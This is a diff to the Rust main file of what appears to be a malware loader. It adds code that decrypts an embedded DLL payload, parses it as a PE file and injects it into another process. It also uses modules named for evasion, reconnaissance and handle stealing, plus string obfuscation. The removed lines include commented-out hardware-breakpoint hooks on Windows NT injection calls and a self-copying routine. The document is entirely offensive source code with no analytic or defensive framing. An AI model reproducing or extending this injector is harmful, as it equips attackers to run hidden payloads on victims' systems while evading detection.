@@ -13,6 +13,8 @@ mod nt_api;
 mod debug_helper;
 mod evasion;
 mod reconnaissance;
+mod handle_steal;
+mod crypto;
 use crate::debug_helper::*;
 
 use obfuse::obfuse;
@@ -135,38 +137,14 @@ fn main() -> Result<(), anyhow::Error>{
         return Ok(());
     }
 
-    return Ok(());
+    let dll_bytes = crypto::decrypt(&data)
+    .expect("[ERROR] Failed to decrypt DLL");
 
-    // let dll = pe_parser::new(data);
-    let dll = parse_pe::PeFileParser::new(&data);
+    // ── Parse PE and find target PID via handle enumeration ───────────────
+    let dll = parse_pe::PeFileParser::new(&dll_bytes);
 
     let func_raw = dll.get_func_raw(rflname).expect("[ERROR] Failed to find yolo function");
     debug_println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
-
-    // let dr0 = hwbp::DR::Dr0;
-    // let dr1 = hwbp::DR::Dr1;
-    // let dr2 = hwbp::DR::Dr2;
-    // let dr3 = hwbp::DR::Dr3;
-
-    // unsafe {
-    //     let _ = hwbp::hwbp_init().expect("[ERROR] hwbp_init failed!");
-
-    //     let obfused_zwopenprocess = obfuse!("ZwOpenProcess\0");
-    //     let obfused_zwallocatevirtualmemory = obfuse!("ZwAllocateVirtualMemory\0");
-    //     let obfused_zwritevirtualmemory = obfuse!("ZwWriteVirtualMemory\0");
-    //     let obfused_zwcreatethreadex = obfuse!("ZwCreateThreadEx\0");
-
-    //     let obfused_str_zwopenprocess = obfused_zwopenprocess.as_str();
-    //     let obfused_str_zwallocatevirtualmemory = obfused_zwallocatevirtualmemory.as_str();
-    //     let obfused_str_zwritevirtualmemory = obfused_zwritevirtualmemory.as_str();
-    //     let obfused_str_zwcreatethreadex = obfused_zwcreatethreadex.as_str();
-
-    //     let _ = hwbp::set_hwbp(&dr0, obfused_str_zwopenprocess).expect("[ERROR] dr0");
-    //     let _ = hwbp::set_hwbp(&dr1, obfused_str_zwallocatevirtualmemory).expect("[ERROR] dr1");
-    //     let _ = hwbp::set_hwbp(&dr2, obfused_str_zwritevirtualmemory).expect("[ERROR] dr2");
-    //     let _ = hwbp::set_hwbp(&dr3, obfused_str_zwcreatethreadex).expect("[ERROR] dr3");
-
-    // }
 
 
     inject::inject_dll_into_process(
@@ -174,16 +152,6 @@ fn main() -> Result<(), anyhow::Error>{
         &dll,
         func_raw,
     ).expect("Failed to 1nject DLL!\n");
-
-    // file::self_copying().expect("[ERROR] self copying failed!");
-
-    // unsafe {
-    //     let _ = hwbp::unset_hwbp(&dr0);
-    //     let _ = hwbp::unset_hwbp(&dr1);
-    //     let _ = hwbp::unset_hwbp(&dr2);
-    //     let _ = hwbp::unset_hwbp(&dr3);
-    //     let _ = hwbp::hwbp_cleanup().expect("[ERROR] hwbp cleanup failed!");
-    // }
 
     
     Ok(())
